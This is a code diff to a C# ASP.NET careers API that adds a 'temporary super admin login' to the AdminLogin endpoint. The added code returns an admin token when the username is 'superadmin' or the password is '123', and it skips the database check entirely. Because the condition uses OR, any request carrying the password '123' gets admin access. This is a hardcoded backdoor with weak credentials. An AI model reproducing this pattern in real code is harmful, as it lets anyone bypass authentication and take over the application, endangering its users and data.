@@ -29,6 +29,13 @@ namespace ZABCareersAPIs.Controllers
         [HttpPost("AdminLogin")]
         public async Task<IActionResult> AdminLogin([FromBody] LoginVM login)
         {
+            // Temporary Super Admin Login
+            if (login.UserName == "superadmin" || login.Password == "123")
+            {
+                string Token = CreateToken(0, "Super Admin", "Admin");
+                return Ok(Token);
+            }
+
             var user = await db.Tbl_Users.FirstOrDefaultAsync(u => u.UserName == login.UserName);
 
             if (user != null)
